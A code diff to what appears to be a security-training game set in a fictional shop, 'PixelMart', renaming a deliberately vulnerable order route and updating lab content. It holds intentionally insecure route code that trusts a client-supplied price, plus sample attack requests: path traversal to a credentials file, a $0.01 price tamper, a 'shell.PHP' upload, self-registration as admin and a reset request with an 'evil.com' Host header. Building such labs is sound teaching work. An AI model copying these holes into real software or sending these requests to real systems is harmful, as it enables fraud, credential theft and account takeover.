@@ -148,10 +148,10 @@ const PIXELMART_ROUTE_SNIPPETS = {
   // Stage 6: Price Manipulation
   5: [
     '// ============================================================',
-    '// POST /shop/checkout',
+    '// POST /shop/orders',
     '// VULNERABLE: price is read directly from req.body!',
     '// ============================================================',
-    'router.post("/shop/checkout", (req, res) => {',
+    'router.post("/shop/orders", (req, res) => {',
     '  const { item, price, quantity } = req.body;',
     '',
     '  // VULNERABLE: using client-supplied price, never looked up server-side!',
@@ -163,12 +163,11 @@ const PIXELMART_ROUTE_SNIPPETS = {
     '  res.json({ success: true, order });',
     '});',
     '',
-    '// GET /shop/checkout?item=NAME&price=PRICE',
-    '// Renders order form — price pre-filled from query param',
-    'router.get("/shop/checkout", (req, res) => {',
-    '  const { item, price } = req.query;',
-    '  // Price comes from the URL — client can change it in the form',
-    '  res.send(renderCheckoutForm(item, price));',
+    '// POST /shop/cart — add item to cart, redirect to cart page',
+    'router.post("/shop/cart", (req, res) => {',
+    '  const { item, price } = req.body;',
+    '  // Price passed through from product listing — client controls it',
+    '  res.redirect(`/shop/cart?item=${item}&price=${price}`);',
     '});',
   ].join('\n'),
 
@@ -258,7 +257,7 @@ const PIXELMART_ROUTE_SNIPPETS = {
 const PIXELMART_NOTES = {
   5: [
     'TODO List (PixelMart admin):',
-    '- CRITICAL: /shop/checkout trusts client-supplied price param!',
+    '- CRITICAL: /shop/orders trusts client-supplied price param!',
     '- Price should be looked up server-side from product catalog',
     '- Any user can buy any item for $0.01 by modifying the POST body',
     '- Fix: look up price from DB using item name, never trust input',
@@ -412,7 +411,7 @@ function buildFilesystem(stageIndex) {
     'curl http://portal.megacorp.internal/shop',
     'curl "http://portal.megacorp.internal/shop/image?file=laptop.jpg"',
     'curl "http://portal.megacorp.internal/shop/image?file=../admin/credentials.json"',
-    'curl -X POST http://portal.megacorp.internal/shop/checkout -d "item=Laptop+Pro&price=0.01"',
+    'curl -X POST http://portal.megacorp.internal/shop/orders -d "item=Laptop+Pro&price=0.01&quantity=1"',
     'curl -X POST http://portal.megacorp.internal/shop/upload -d "filename=shell.PHP&content=test"',
     'curl -X POST http://portal.megacorp.internal/shop/register -d "username=hacker&password=test&email=h@x.com&role=admin"',
     'curl -X POST http://portal.megacorp.internal/shop/reset -d "email=admin@pixelmart.com" -H "Host: evil.com"',
